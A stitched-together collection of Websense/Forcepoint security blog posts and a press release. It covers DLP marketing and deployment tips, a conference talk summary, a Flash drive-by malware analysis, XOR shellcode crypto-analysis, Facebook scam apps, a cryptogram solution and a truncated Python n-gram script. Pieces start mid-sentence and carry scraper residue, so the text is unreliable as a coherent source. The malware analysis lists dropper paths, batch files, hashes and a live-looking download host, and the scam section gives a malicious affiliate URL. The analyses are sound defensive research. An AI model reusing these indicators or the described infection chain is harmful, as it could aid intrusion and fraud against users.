(NASDAQ: WBSN), a global leader in unified Web, data and email security solutions, today announced the availability of “DLP for Download,” the Websense® industry leading Data Security Suite that can be downloaded , installed and deployed in a matter of minutes from Websense.com.\nEven though data breaches cost companies millions of dollars, DLP solutions have not been broadly adopted because they have been extremely complex to install.  These traditional first-generation solutions take months and hundreds of hours to deploy. Websense changes all of that with DLP for Download, which provides industry-leading, enterprise-class protection that can be downloaded and installed in just 30 minutes. With dramatically faster time-to-implementation and drastically lower total cost of ownership, this critical technology is finally ready for mass adoption in enterprises and midsize businesses.\nThe problem is not abating. Data breaches (such as the recent Aurora attacks on Google and other companies) routinely appear in today’s headlines. Such attacks target confidential and proprietary company data, and experts say that in many cases the costs of such breaches runs in the millions of dollars for investigation, fines and litigation. In a recent study, the Ponemon Institute placed the cost of certain data breaches as high as $204 per record and that such breaches cost organizations an average of $3.43 million (i).\nFor the first time ever, Websense DLP for Download makes data loss prevention available without a massive investment in time, resources and cost. And without the overhead of high integration and deployment costs. And without the burden of ongoing maintenance. With DLP for Download, enterprise-class protection is affordable and practical for companies that previously have not had the resources for an implementation or who faced insurmountable costs and complexity from legacy, first-generation solutions. Customers can download and evaluate the Websense DLP solution free for 30 days. It installs in approximately 30 minutes and can be easily purchased and used for a production deployment with no more than a change in the subscription key. Built-in deployment wizards guide administrators through setup and configuration, all from a single installer, while a policy-design wizard delivers point-and-click policy controls for compliance and protection of sensitive data. No other DLP solution provider provides such effectiveness and simplicity.\n “With today’s regulatory and threat landscape, data loss, whether through targeted attacks or inadvertent exposure, can be a perilous and costly event for companies, leading many to seek DLP solutions,” said Websense customer Chris Sawall, supervisor, Information Security, Ameren Services (part of Ameren Corporation, parent of the largest electric utility company in Missouri and the second largest electric utility in Illinois). “Unfortunately, these solutions are often complex and both time and resource-consuming deployments. With Websense DLP for Download, this dynamic has changed and more organizations can rapidly deploy and take advantage of the benefits of this technology in a timely and cost-efficient manner, ensuring the safety and protection of their sensitive corporate information.”\nYou can watch a video of Sawall describing today’s threat landscape and Ameren’s deployment of the Websense Web Security Gateway and unified Data Security Suite here.\nWebsense DLP for Download provides smaller companies with the same market-leading and mature technology deployed by Global 100 companies.  Mid-market and enterprises who previously thought DLP was unapproachable due to its complexity and costs can now enjoy the same level of security.\nIncluded with the download is a step-by-step guide to getting started as well as video tutorials illustrating the installation, configuration and policy definitions. Once installed, with more than 1,100 policies and built-in templates, accessible through a wizard, customers can easily define new policies or leverage existing templates. The templates can also be filtered based on industries and geographical regions with granular filtering capabilities beyond what is currently on the market today.\n“Through DLP for Download, Websense is proving our commitment to lowering the barriers and costs traditionally associated with deploying the best modern security against today’s threats,” said John McCormack, president, Websense. “This is a significant step for organizations looking to secure their businesses. We will continue to improve our already strong model of deployment, technology development and support to provide organizations the security and protection they need in today’s regulatory and threat environment.”\nIn addition to making standalone DLP deployable in minutes through the download program, customers benefit from the Websense TRITON™ architecture, enabling Websense to embed enterprise-class DLP directly within its market leading Web Security Gateway solutions. With Web Security Gateway Solutions, customers do not need to deploy any new DLP product at all to establish compliance controls over Web communications (e.g., Facebook and Twitter); it is simply built into their Web security product, and is expandable to the full enterprise Data Security Suite. This tight integration and unification of data and Web disciplines also provides key context and destination awareness of data, a major factor in being able to effectively apply policies for appropriate data exchange. No other Web security product integrates enterprise-class data loss prevention in a unified content security solution with this level of capability, control and flexibility. This also helps mitigate the increasing trend of data loss over the Web.\nFollowing deployment, Websense Data Security solutions, as well as other Websense solutions using the TRITON architecture, are supported by Websense award-winning customer support and TRITON(TM) solution Customer First Initiative, a three-pronged program that includes enhanced support, training and tools, and education to help customers achieve the best security at the lowest total cost of ownership using the Websense TRITON solution.\nOrganizations interested in DLP for Download can visit http://www.websense.com/DownloadDLP to receive an evaluation license.

With massive amounts of content and data streaming throughout the enterprise in support of countless business processes, the idea that we can somehow wrangle this information in any meaningful way, with minimal disruptions to business process, is daunting if not neigh on inconceivable. This idea is especially reinforced among security professionals still smarting from the pain of deploying and managing the constant false positives and tuning requirements of intrusion detection systems.\n\nSince I started to cover DLP technologies about 7 years or so ago, I\'ve talked with hundreds of people who have evaluated and/or deployed data loss prevention. Over the course of those conversations I\'ve learned what tends to work, what doesn\'t, and how to reduce the potential complexity of DLP deployments. Once you break the process down it turns out that DLP isn\'t nearly as difficult to manage as some other security technologies, and even very large organizations are able to rapidly reap the benefits of DLP without creating time-consuming management nightmares.\n\nThe trick, as you\'ll see, is to treat your DLP deployment as an incremental process. It\'s like eating an elephant- you merely have to take it one bite at a time. Here are my top 3 tips, drawn from those hundreds of conversations:\n\n1. Narrow your scope:\n\nOne of the most common problems with an initial DLP deployment is trying to start on too wide a scale. Your scope of deployment is defined by two primary factors- how many DLP components you deploy, and how many systems/employees you monitor. A full-suite DLP solution is capable of monitoring network traffic, integrating with email, scanning stored data, and monitoring endpoints. When looking at your initial scope, only pick one of the components to start with.\n\nI usually recommend starting with anything other than endpoints, since you then have fewer components to manage. Most organizations tend to start on the network (usually with email) since it\'s easy to deploy in a passive mode, but I do see some companies now starting with scanning stored data due to regulatory requirements.\n\nIn either case, stick with one component as you develop your initial policies and then narrow the scope to a subset of your network or storage. If you are in a mid-sized organization you might not need to narrow too much, but in large organizations you should pick a subnet or single egress point rather than thinking you have to watch everything.\n\nWhy narrow the scope? Because in our next step we\'re going to deploy our policies, and starting with a single component and a limited subset of all your traffic/systems provides the information you need to tune policies without being overwhelmed with incidents you feel compelled to manage.\n\n2. Start with one policy:\n\nOnce you\'ve defined your initial scope, it\'s time to deploy a policy. And yes, I mean *a* policy, not many policies. The policy should be narrow and align with your data protection priorities; e.g. credit card number detection or a subset of sensitive engineering plans for partial document matching.\n\nYou aren\'t trying to define a perfect policy out of the box; that\'s why we are keeping our scope narrow. Once you have the policy ready go ahead and launch it in monitoring mode. Over the course of the next few days you should get a good sense of how well the policy works and how you need to tune it. Many of you are likely looking for similar kinds of information, like credit card numbers, in which case the out of the box policies included in your DLP product may be sufficient with little to no tuning.\n\n3. Take the next bite:\n\nOnce you are comfortable with the results you are seeing it\'s time to expand your deployment scope. Most successful organizations start by expanding the scope of coverage (systems scanned or network traffic), and then add DLP components to the policy (storage, endpoint, other network channels).\n\nThen it\'s time to start the process over with the next policy.\n\nThis iterative approach doesn\'t necessarily take very long, especially if you leverage out of the box policies. Unlike something like IDS you gain immediate benefits even without having to cover all traffic throughout your entire organization. You get to tune your policies without being overwhelmed, while managing real incidents or exposure risks.\n\nRich has twenty years experience in information security, physical security, and risk management.

', 'Sean BergVinny SharmaForcepoint ', '\n      \n    \n      \n      \n   ', 'There is little argument that data is the world’s newest currency. Whether by accident, fraud, policy violation or neglect, the exposure or loss of confidential information is one of the biggest threats to an organization’s security. To make matters worse, the social Web and the consumerization of information technology has made it possible for sensitive information to get lost through the organizational cracks.  \nData loss has quickly become a top concern for IT security professionals. High-profile data loss reports consistently highlight sensitive data loss as a serious problem that many organizations are not equipped to handle. Unfortunately, many IT professionals have difficulty understanding the various elements that encompass this quickly emerging technology. Because of its fast evolution, vendors rolled out products in hopes of gaining market share and capitalizing on the hype and chaos. This is an ongoing problem in the security world: Too many vendors (big and small) have crossed over into areas where they lack the expertise and proper infrastructure. \nIt is not the first time vendors offered solutions convenient for their bottom line instead of focusing on the users’ best interest. The security of customers’ data using the best technology at the lowest total cost of ownership should always be a priority.\nMany vendors will target IT professionals looking for DLP by getting them to add DLP into their enterprise at the endpoint. While this might be appealing, starting with endpoint DLP typically leads to high costs, great complexity, and requires a great deal of effort. In the end, this seemingly cost-effective strategy backfires. Customers who fall for this typically end up paying more once prices for on-going management, licensing, and extra servers are factored into the cost and they try to expand to network protection and discovery and find their endpoint solution lacks capabilities, coverage, unified management, and more. This flawed approach is perhaps best summarized by the old adage: “You get what you pay for.”   \nSo what are IT professionals in need of a DLP solution to do? \nLook for a DLP solution that can monitor and enforce compliance with industry and government regulations. Solutions should enable the use of Web 2.0 while providing protection for the communication of confidential data. The most common complaints about DLP are that they’re too costly and complex.  An effective solution must accurately detect confidential data — a system with too many false positives creates massive administrative overhead while providing little real value. The solution should also provide policy tools and pre-built policy templates that address common DLP concerns so that the system can deliver value without spending months (or years) doing labor-intensive policy tuning.    Evaluate not only the effectiveness of the solution, but also its viability as an affordable and realistic solution to own.  Additionally, when looking to invest in a DLP solution, buyers should closely examine not just interoperability, but whether the solution is actually unified with existing content solution architectures that include full Web and messaging capabilities. This kind of integration can significantly lower your cost of ownership and ease administration, and also provides you with a migration path from a channel DLP (such as email or Web) to a full, enterprise DLP implementation.  This approach gives you a clear and simple course to getting started, gaining experience, and expand your implementation effectively.  Websense offers the market’s leading DLP technology as part of its Websense TRITON unified content security solution.  For more information on Websense, visit http://www.websense.com/DSS.', 'https://www.forcepoint.com/blog/insights/implementing-dlp-purchase-caution\n');

We had a fun time sharing our ideas and findings. Here are brief descriptions of the talks that I attended.\n \nRainbow Tables Reimplemented\nSebastian \"naxxatoe\" Graf\nThis talk was about reimplementing traditional rainbow tables in a more efficient way.The speaker has some source code and a table itself to release in the near future.\n \nHaving fun with Apple\'s IOKit\nIlja Van Sprundel, IOActive\nThe speaker presented some preliminary research on the IOKit from the perspective of the security researcher. It seems as if no one else has investigated this issue thoroughly, and it could be the next gold mine.\n \nAuditing C#\nVincent Berg, IOActive\nThis talk offered both basic and advanced material on auditing the code written in C#. C# is regarded as a generally secure language, but still there are many ways in which it can fail.\n \nEscaping the Sandbox\nStephen Ridley, Matasano\nThis speaker described many types of sandboxes currently in use on Windows systems. He showed real examples and used debugger output to demonstrate various options that modern sandboxes are capable of providing. He also released a sandbox analysis toolkit called SandKit, which is available here.\n \nDarunGrim - A Tool for Binary Diffing and Automatic Vulnerabilities Pattern Matching\nJeongwook (Matt) Oh\nThis was actually my presentation. I presented the technology of binary diffing.  And, I proposed a new concept of smart binary diffing. I built a system for binary management and introduced a new index value called \"security implication score\".  This score tells you which modification has more security implications. The package that contains all of these improvements will be released in a few weeks. The presentation material is available here.\n \nFighting PDF Malware with ExeFilter\nPhilipe Lagadec, NATO/NC3A\nPDF is a hot issue these days. And here\'s the tool to sanitize all your suspicious PDF files before you open them. This is a great open source project to implement a PDF normalizer that will remove any suspicious objects from the PDF files. The package is available from here.\n \nDefending the Poor - Flash Defense\nJoern Bratzkei, Recurity Labs\nThis presentation was about a project funded by the German government. The project page is here. The cool thing is that this is an open source project. The main functionality is normalization through recreation. It actually understands flash AVM code and rewrites it to be normalized and to be harmless. The only pitfall I\'m seeing is that this currently supports only AVM1 code.\n \nHacking Oracle from Web Apps\nSumit Siddharth, 7Safe\nUnfortunately, I was not able to attend all of this presentation. But the demonstration was cool.  Using SQL injection, you can basically execute any commands you want on the server.\n \nLocation Aware DoS Attacks (how proposed IETF drafts can change the future of DoS)\nKeith Myers & Jose Avila, ONZRA\nThis talk was about abusing EDNS to circumvent location-based DNS reponses. This technique will open a way to find the actual target the attacker is interested in, for DOS attacks.\n \nMilking a horse or executing remote code in modern Java Web frameworks\nMeder Kydryraliev, Google\nThe speaker presented a unique way to own a Java Web framework. By overwriting some internal variables using the Spring Web Framework vulnerability, he could own the Web server and could execute any command he wanted, using the bug. The related vulnerability is published here.\n \nLegic Prime: Obscurity in Depth\nKarsten Nohl & Hendryk Plötz, Security Research Labs\nThis talk was about breaking an RFID smart card called Legic Prime. This card was introduced more than a decade ago and has been known to be very safe against duplication or forgery. But two brilliant researchers cracked the underlying obfuscation logic and could duplicate or make any kind of card they wanted.\n \nHacking Printers for fun and profit\nAndrei Costin\nThis talk was about owning printers. Printers could be a critical attack point in the future. There are many potential ways that they can be backdoored and used for collecting valuable information. Even more serious is that nobody seems to be paying attention to protecting printers, even though they can be easily misused. The full presentation file is here.\n \nImmature Femtocells\nRavishankar Borgaonkar & Kevin Redon, Technical University of Berlin\nThis talk was about exploiting a femtocell device. I had never heard about femotcell before. Basically it\'s a personal cell tower. You just connect it through broadband, and it will pass through all your cell phone and data traffic. In case you\'re out of coverage from your cell phone service provider, you can use this device to enable your cell phone to work through Internet connection. The device is supposed to be heavily protected. What the speakers accomplished was jailbreaking and rooting the device. And the device itself tries to gather location information from various sources like IP address and GPS signal. But they could all be circumvented like by using $12 GPS jammer and VPN connection to home network. Basically with the methods they presented, you can use your cellphone anywhere in the world without additional charges. They included some live demos. U.S. wireless service providers have similar devices, and this is a problem that we all need to pay more attention to.\n \nThat\'s it. This conference was unique, and a great experience for me. All subjects gave me something to think about. Thanks to @dragosr and the SecWest staff for inviting me to this great conference.\n \nMy next talk will be at Blackhat USA 2010 and Defcon 18, so if you\'re interested in binary diffing or locating vulnerabilities using static analysis, my talk may help you a lot.

Adobe categorized this as a critical update and strongly recommended to install it. And from Brad Arkin, Adobe\'s Director of Product Security and Privacy, Adobe has considered reducing the update cycles for Adobe Reader from 90 to 30 days to reduce the pressure from customers who have already suffered a lot due to the security vulnerabilities. Flash and Shockwave may also be brought into this update cycle. \nA zero-day vulnerability in the Safari browser has been discovered: the vulnerability may lead to the exposure of sensitive information or even execute arbitrary code. A POC (.rar) has been published here. \nOpera Software has released Opera 10; an \"extremely severe\" security vulnerability that may lead to remote code execution attacks has been patched. \n In October 2009, Mozilla pushed the \"Plugin Check\" project live, which can check the update information of plugins in Firefox and help customers to update. This was a very good idea as old versions of plugins are a major security hole nowadays.

While remote code execution is possible, Microsoft considers denial-of-service attacks more realistic. While their advisory is still available, Microsoft appears to have retracted theirMSRC/SRD blog post about the vulnerability.\n\nHello ThreatSeeker. You\'ve got mail!\nMalicious social engineering just doesn\'t seem to go away and looks like it won\'t any time soon! This month has been a testament to that with all the different tricks being used. We saw lures involving Facebook, iTunes, Amazon, Adobe, and even job applications . \nEarly in the month, we reported on a campaign of malicious emails which enticed users into installing a backdoor. The fruit of temptation was a Facebook toolbar which was spread via a link in the email; the link even led to a file named toolbar.exe. We also reported on a campaign of malicious attachment spam which claimed to be iTunes gift certificates. There were also messages from supposed job hunters which were sent out in a large email campaign. The unfortunate victims of this job hunter spam campaign were met with a rogue AV installation. Last, but of course not least, we saw the ever-present threat, Zeus, sending out a clever new campaign of emails. This campaign took great care in tricking victims into downloading malware. These Zeus messages contained a PDF attachment as well as a link to a malicious executable file in the email message. To make the messages more believable, they were made to look like forwarded mail from a security director within your company which explained that Adobe Reader needed to be updated.\n \n\n \n\n \n\n \n\n \n\n\nSecurity Trends\nSymantec’s recently report (.PDF) said the Zeus crimeware kit and the growth of malicious PDFs based on the integration of Adobe flaws in popular malware kits make it easier for unskilled attackers to compromise computers and steal information.The effectiveness of an up-to-date antivirus against Zeus is just 23%.

The emails have either contained an attached PDF file that contains the exploit to force the machine to automatically download malware when opened or as in this example, contained a URL that performs a drive-by download when visited to infect the machine. This is similar to how some of the Aurora attacks took place. Below is an email that was picked up by our ThreatSeeker network:\n\n\nFor the exploit to work the attackers need shellcode to make the exploit do something, such as download and execute a file. When the attackers use a PDF file the shellcode is part of the PDF itself but in the drive-by scenario they\'re using JavaScripts in HTML pages to do it. A screenshot can be seen here of what it looks like:\n\n\n\nZero detection\nThe SWF file (Flash file) that gets pushed to the users PC is unfortunately not well detected. In fact, zero antivirus vendors detect it according to VirusTotal. Detection of the shellcode doesn\'t look much better either with just one vendordetecting it. We at Websense had this detected since January 5th, 2009 (that\'s over a year!!) thanks to our ability to do real-time scanning on web content in Websense Security Gateway. The actual malware that gets downloaded in the endisn\'t detected by anyone either. A quick analysis of the binary revealed it was an encrypted file with XOR 0x95, once decrypted by the shellcode the file detection is slightly improved.\n\n \nThe payload\nIn the next stage the shellcode runs the decrypted file which drops a file called iexplore.dll to %userprofile%\\Start Menu\\Programs\\Startup\\, this file is also very badly detected. After the file gets dropped its extension is changed toiexplore.exe by a batch script dropped at %programfiles%\\Windows NT\\cbt.bat. Then iexplore.exe attempts to open some content from hjkl.wekby.com/testaaaaaaaaa.txt with Microsoft\'s® HTML Help Executable located at %windir%\\hh.exe (that\'s a legitimate file). Unfortunately, the URL wasn\'t responsive at the time of the analysis, but iexplore.exe constantly checks with another batch script located at %programfiles%\\Windows NT\\1.bat if the file gets successfully downloaded. An infected machine at this stage will have 5 files and repeated attempts to run the batch files and access hjkl.wekby.com for testaaaaaaaaa.txt, here are the system locations details and MD5s:\n \nEncrypted executable: %userprofile%\\local settings\\temporary internet files\\sss[1].exe c8816edfa228e460bf52eb1dbcb4a746\n  Decrypted executable: %userprofile%\\local settings\\temporary internet files\\ssb[1].exe 7175b91dba6844439a94e7be2ef47059\n  Dropped file: %userprofile%\\Start Menu\\Programs\\Startup\\iexplore.exe 8ee79709f8c53c446eff31cdf93949fe\n  Batch file: %programfiles%\\Windows NT\\cbt.bat 6c47930dd19fa38777de8c63824f4658\n  Batch file: %programfiles%\\Windows NT\\1.bat f8e7044d6d62d42220933cf501d1b1e5\n  This is just one if several URLs and files we have seen used in these targeted attacks\n \nPatch\nAdobe has announced that they will release an updated Flash Player tomorrow, June 10, which will help in the drive-by scenario.

By Googling the text inside the file, we found it was generated from a benign SWF file inside the AES.zip file. This might mean that the attacker used the SWF file for dummy fuzzing. We used our custom SWF decoder to perform this SWF diffing operation. The actual difference between the original file and the crashing one is just one byte in the Action Script Byte code (DoABC tag type). The original byte 0x66 was modified to 0x40.\n\n\n Figure 1: Diffing between original and exploit SWF records\n\n  You can look up the AVM2 reference to see what each opcode means. The original opcode 0x66 is \"getproperty\", while the modified opcode 0x40 means \"newfunction\".\n\n  We also confirmed this code modification by using an SWF decompiler and one of the file diff tools. We used abcdump.exe and a UNIX diff tool to get the following result.\n Figure 2: Diffing between decompiled codes\n\n  You can see that the original \"getproperty\" opcode has been changed to the \"newfunction\" opcode. Basically, this crash or exploit stems from either the SWF file, or a file embedded inside a PDF that contains the DoABC Tag Record with a \"newfunction\" opcode that has an invalid argument.\n  With more investigation, the theory we presented previously didn\'t fit into what we found later. The problem might cause security issues, but this exploit was not activated by that vector. Here\'s what we got with further analysis.\n  The shellcode is coming from dynamically generated code in the memory. In the following picture, the ECX register is already contaminated when the call is made.\n\n\n Figure 3: Contaminated ECX register\n\nIf you trace back to where the ECX value is originating, you can find that it\'s originally from the third argument for the function(dword ptr [ebp+10h]). It\'s not using the third argument value directly, but there are some indirections with fixed offsets. The problem is that this caller-supplied address contains an invalid address and the pointer value of this address happens to point inside heap-sprayed memory.\n\n\n Figure 4: Invalid address\n \nWe traced back to the caller and checked the third argument for the call. As you can see from the following picture, the third argument is coming from an EBX value in address1BEF0. It goes through an OR operation with 1, which makes the address unaligned. We don\'t think this is intended, but think this is a kind of  opcode generation error that is leading to invalid memory access.\n\n Figure 5: Third argument value\n \nHeap-spray makes a lot of vulnerabilities exploitable that might previously have been thought useless.

Exploits seek out the vulnerabilities of an application to launch their malicious activities. Cyber criminals target popular applications such as Shockwave Flash and Adobe Acrobat PDF to keep the chances high that a user\'s computer is vulnerable. In this blog we will examine a Flash exploit using a very simple crypto-analysis technique we call X-ray.\n\nCrypto-analysis of malicious code is not a new technology or invention. It has been used in fighting MS-DOS viruses since the \'90s. This article provides an in-depth, detailed discussion on this subject, explaining how it works and how it can be used for malicious content detection in shell code.\n\nFirst we need to understand the X-ray technique and how it works, and then we can see how it helps us to analyze and detect malicious content in shell code. X-ray is basically a differential crypto-analysis method which is a very easy way to attack simple encrypted data. What we assume is that when a simple block encryption algorithm is used, the difference between the consecutive data blocks remains the same.\n\nOne very good way to explain this is to encrypt a picture and then try decrypting it. Take a look at this picture:\n\n\n\nThe picture does not tell us much, except that we can see that it is encrypted. It looks random enough, even though we can spot some repetition. In fact the algorithm used is very simple stream ciphering with some avalanche effect. The result is a picture that suggests very little about itself. However, when we generate the difference in between the consecutive bytes, we get this:\n\n\n\nAh-ha! Now we see that this is the logo of our secret weapon against Internet threats.  :-)  (See the original graphic below)\n\n\n\nNow, no wonder it is called X-ray!  We may not see the \'skin\', but we clearly see the \'bones\'. The resulting picture is far from the original one, but is good enough to see what it was. Nice, but how does it work?\n\nTo understand, we need to get into the math behind cryptography. Take a look at this very simple block ciphering algorithm. We have a message of:\n\n\nWhere M is the n length of plaintext message and m is the block of the message (typically a character).\n\nIn order to get the ciphered message of:\n\n\nWhere C is the n length of ciphertext (encrypted) message and c is the block of the message (typically a character), we need to apply an encryption to each one of the message blocks using the same key:\n\nWhere E is the encryption algorithm using k key.\n\nWhen E encryption algorithm is a simple XOR using the same k key on each block, then\n\n\n\nthe (above) formula gives us the encrypted stream. Usually we see this simple method in shell code with byte size blocks. In other words, each one of the characters of clear text is simply XORed with a constant (see the pseudo code). The reason this kind of encryption is so popular is that it is easy to understand and it is also easy to obfuscate the data and the code sections enough to avoid detection by a simple string detection engine.\n\nNow we can note that a simple differential analysis will easily decypher this kind of encryption:\n\n\n\nWhy? Because:\n\n\n\nBecause XOR is commutative, we can remove the brackets and reorganize the equation to:\n\n\nWe know that:\n\n\n\nTherefore:\n\n\n\nAs we can see, a simple block ciphering does not provide strong encryption. And because simple block ciphering is widely used in exploits, we can easily break those by decyphering known text or binary content in them. To put the theory in practice, let\'s take a look at this simple decryption loop taken out of shell code used in an SWF exploit:\n(MD5 of the sample: 32398CBF94CA9B42E0B415BB93B00CFE)\n\n\nAs we can see, the code uses byte size blocks and a simple XOR ciphering with a constant 0x3D. Inside the code we can also see a pattern starts with some 0x3D following by a text \"UIIM\":\n\n\n\nWe might suspect that is an encrypted URL starting with \"http://\". Now that we know the algorithm and the encryption key, it is easy to double check if our suspicion is correct. The question is how do we find this string without knowing the key?\n\nDo you remember the differential attack? All we need to do is to take a known text, which is \"http://\", and create a stream of differences:\n\n\n\nSimilarly, we create a difference on the encrypted stream:\n\n\n\nAnd then, if we can find ΔM in ΔC, then we have what we are looking for. Obviously, the longer the known text, the less prone it is to falsely detecting the string.\n\nThe next step is to determine the key, and decipher the entire URL, which is very simple by just doing an XOR on the first detected block and the first block of the known text:\n\n\nKnowing all of this, we can now write a simple analysis tool that can find and extract \'interesting text\' from a binary file. As an example, here is the output of a small Perl hack I wrote earlier (see the script attached below):\n\n\n\nThe good thing about this technique is that we have to generate the differential set from the known text set only once in the lifetime of the application. Also, we need to generate the differences of the scanned shell code only once to check all the known text from our dictionary. Our dictionary therefore can be huge, including not only known and unknown URL patterns, but binary sequences that can identify each type of shell code we already know.\n\nSo far so good, however, life would be too easy if all of our work was finished now, yes? Many times, we see the shell code in compressed and otherwise obfuscated format. For example a Flash file could be compressed, or in a PDF file each stream can be compressed and encoded in different ways, which than can contain obfuscated JavaScript code that holds the shell code. The detection or analytics engine therefore first needs to do all the necessary transformations and de-obfuscations in order to be able to analyze the shell code. Maybe this is one of the reasons we can see simple encryptions most of the times.\n\nAlthough in reality we see mostly simple block ciphers in exploits, there are many examples in viruses and trojans of much more sophisticated encryptions. These use a variety of block and stream ciphers with different length encryption keys, even applying more than one algorithm on top of each other to harden the encryption. Breaking such ciphertext requires more complex method, however, due to constantly increasing computing power, it is even possible to attack the DES algorithm. The good news is that even when stronger encryption has been applied, we have better techniques to detect malicious content.\n\n Crypto-Analysis_in_Shellcode_Detection.zip', 'https://www.forcepoint.com/blog/security-labs/crypto-analysis-shellcode-detection\n');

For the third weekend in a row users on Facebook are bombarded with messages on their walls talking about Distracting Beach Babes, Sexiest Video Ever or this latest attack which supposedly is the \"Most Hilarious Video ever\" shown in the screen shot below.\n\n \nWe predicted that this attack would happen again and unfortunately we were right. \nThis attack is different from previous weekends as not only do the attackers try to steal your Facebook credentials, what happens after that depends on which country you connect from. Once you click on the link to view the video you are taken to a fake Facebook login page where you are tricked into entering your credentials. The login page look like the real thing except of course if you look at the address bar you can see that you\'re not on facebook.com. But users can easily be tricked into thinking that they temporarily were logged out of Facebook and to continue they have to login.\n\n \nRegardless of what you enter in the login form you are then taken to a page on the real Facebook site that asks you to allow the application to access your profile. If you allow that you\'re taken to a page saying that you need to upload your FLV Player to view the video. Up until this point it\'s similar to how the two previous attacks have worked, except that this new one also has the phishing component. However, what happens now depends on which country you are connecting from. \nIf you are coming from a US IP address you are prompted to download the FLV Player, which is detected by 35% of antivirus engines, as can be seen in the screen shot:\n\n \nHowever, if you\'re coming from a UK IP address you\'re taken to a quiz where they have to answer 10 questions.\n\n \nOnce completed the user then gets the chance to win an iPad! All they have to do is to fill in their address. So instead of tricking the user into installing a malicious file, this time they\'re after your information in addition to your Facebook credentials from the fake login page.\n\n \nIt\'s very likely that the behavior is different than the two examples we have described depending on which country you connect from. In our testing we only had the ability to test this attack from the US and UK but regardless of where you are connecting from you shouldn\'t click on the fake video and never, ever give you Facebook username and password to a website that is not facebook.com.

If it doesn\'t it will prompt the user to grant it permissions using Facebook APIs.\n  It then enumerates the list of friends, picks a random number (in this case it\'s hardcoded to be 10) and posts a message to the walls of the 10 randomly picked friends.\n  A message is then displayed asking the user to click \"Continue\" to watch the video.\n  Yet another page is displayed that loads a thumbnail of a video and overlays the image with a prompt saying that the \"FLV Player\" needs updating.\n  When the user clicks on \"Continue\", it loads the file videoplayer.php which does a simple redirect tohttp://www.flvpro.com/downloadfile.php?aff=3447_movies, where 3447_movies is the affiliate ID of the group/person behind the malicious app.\nSo far we have identified over 100 apps on Facebook that are all working the same way; the only difference is the API and secret keys that are used. In addition to them all working the same way, they also use the same Google Analytics UA ID to track visitor statistics.\n\nOverall the app is very simple and relies fully on social engineering.

After looking at the description, I knew that in this cryptogram, the key was created by taking the title of a book. The author gave very detailed information on the method of encryption. The indications were that the author had not expended energy on making the key hard to find, and therefore the book name might be well known,  making this only a game rather than an enigma.\nFirst, I searched \"most popular books\" and found some clues. I tried to use allbookstores.com with no success, but goodreads.com was much more useful.\n\n\nGoodreads.com is the largest social network for readers in the world. There are many popular books but which book\'s title would be the key? There was another possible clue in the background of the game. The author was a computer engineer, and those trying to decrypt the challenge are obviously a group of computer guys, so the kind of books they are most conversant with would be in the computer category.   So I decided to search for the book’s name in that category.\n\n\n\nFinally, I tried the the listed books as possible keys to replace the cipher text, and the third was correct. I had only heard of the famous one in the list, “The Mythical Man-Month”, so I guessed it might be the key, and was lucky.  \nI took the title of the book and wrote down each unique letter from the title in the order it appeared. Once all letters from the title were used up, the remaining letters of the alphabet were added in order. The cipher table was:\n       input:  ABCDEFGHIJKLMNOPQRSTUVWXYZ       output: THEMYICALNOBDFGJKPQRSUVWXZ\n \nReplace each letter in the cryptogram using the cipher table, and the plaintext was:\n \n    inma nywa ysma nagi ngal arge comp    uter prog ramm ingp roje ctis like    mana ging anyo ther larg eund erta    king inmo rewa ysth anmo stpr ogra    mmer sbel ieve buti nman yoth erwa    ysit isdi ffer enti nmor eway stha    nmos tman ager sexp ect \n\n  Then I corrected the segmentation of the words:\n     in many ways managing a large computer programming project    is like managing any other large undertaking in more ways    than most programmers believe but in many other ways it is    different in more ways than most managers expect \n \nSee also: A Simple N-gram Calculator: pyngram.

Thanks to colleague Arik Baratz! \n\nRecently, as I was trying to solve a cryptogram, I wrote a tool to parse the bigrams and trigrams from the ciphertext, tally the frequency, and then display the results sorted from most to least frequently occurring bigram and trigram.\n\nFirst, a quick history of why I did this and how this was handy.\n\nOne of the ways to solve a substitution cipher is to do a frequency analysis. Here\'s a typical distribution of letters in the English language. Just as it is obvious that the letter \'e\' is by far the most popular in the English language, you can also calculate the most frequently occurring bigram (2 consecutive characters) and trigram (3 consecutive characters). In English, the top most frequently occurring bigrams are \'th\' (1.52%), \'he\' (1.28%), \'in\' (0.94%) (full list from Wikipedia here). For trigrams, the most popular are \' th\' (note the leading whitespace), \'he \' (trailing whitespace), followed by \'the\' (full list here). The biggest assumption here is that the plaintext is in English. If it\'s in say, German, then you\'ll have to find the corresponding statistical distribution (Wikipedia has the 1-gram frequency distribution for other languages here).\n\nWhatever the plaintext\'s (human) language is, you\'d have to find the top n-grams occurring in the ciphertext first—and that\'s what this calculator will do for you. You can import the python module and call the function calc_ngram, or just invoke the .py file from your *nix command line.\n\nExample usage from python shell:\n\n\n>>> from pyngram import calc_ngram\n>>> # calc_ngram(inputstring, n-gram size)\n>>> results = calc_ngram(\'bubble bobble, bubble bobble, bubble bobble\', 3)                        \n>>> for l in results: print l[0] + \' occured \' + str(l[1]) + \' times\'\n...\nbbl occurred 6 times\nble occurred 6 times\nle  occurred 3 times\nobb occurred 3 times\n bo occurred 3 times\ne b occurred 3 times\nubb occurred 3 times\nbub occurred 3 times\nbob occurred 3 times\n, b occurred 2 times\n bu occurred 2 times\nle, occurred 2 times\ne,  occurred 2 times\n\n\nHere\'s the source code (download (Please visit the site to view this media)), or better yet, install it with \'sudo pip install pyngram\' (from Python\'s Package Index \"Cheeseshop\").\n\n\n#!/usr/bin/env python\n\n# A simple Python n-gram calculator. \n#\n# Given an arbitrary string, and the value of n\n# as the size of the n-gram (int), this code \n# snip will show you the results, sorted from\n# most to least frequently occurring n-gram.\n#\n# The \'sort by value\' operation for the dict \n# follows the PEP 265 recommendation.\n#\n# Installation:\n#\n# user@host:~$ sudo pip install pyngram\n#\n# Quick start:\n#\n# from pyngram import calc_ngram\n# calc_ngram(\'bubble bobble, bubble bobble, bubble bobble\', 3)\n#\n# Enjoy!\n#\n\n__version__ = \'1.0\'\n__author__ = \'Jay Liew\' # @jaysern from @websenselabs\n__license__ = \'MIT\'\n\nfrom operator import itemgetter\n\ndef calc_ngram(inputstring, nlen):\n    if nlen < 1:\n        raise ValueError, \"\"\"Uh, n-grams have to be of size 1 or greater. \\ \nIt makes no sense to have a 0 length n-gram.\"\"\"\n\n    if len(inputstring) < 1:\n        raise ValueError, \"\"\"umm yeah, ... the inputstring has to be longer than 1 char ;)\"\"\"\n\n    # now, fish out the n-grams from the input string\n    ngram_list = [inputstring[x:x+nlen] for x in xrange(len(inputstring)-nlen+1)]\n\n    ngram_freq = {} # dict for storing results\n\n    for j in ngram_list: # collect the distinct n-grams and count\n        if j in 